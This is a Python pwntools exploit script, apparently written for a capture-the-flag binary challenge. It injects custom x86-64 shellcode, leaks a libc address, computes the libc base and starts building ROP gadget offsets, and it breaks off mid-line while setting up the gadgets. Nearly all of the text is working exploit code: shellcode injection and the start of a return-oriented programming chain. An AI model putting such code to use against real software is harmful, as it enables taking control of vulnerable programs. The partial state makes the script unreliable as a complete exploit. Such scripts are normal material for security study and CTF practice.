from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
#libc=ELF('./libc-2.31.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p,'''
    b *$rebase(0xcf8)
''')

ru(b'bytes!\n')
shellcode = asm('''
    movq rsp, xmm0
    push rsp
    pop rsi
l:
    shr edi, 13
    and eax, edi
    syscall
    jnz l
    ret
''')

s(shellcode)
ru(b'works~\n')
leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('leak_addr', leak_addr)

libc_base = leak_addr - 0x1d2980
pr('libc_base', libc_base)

pop_rdi = libc_base + 0x23b6a
pop_rsi = libc_base + 0x2601f
pop_rdx = libc_base + 0
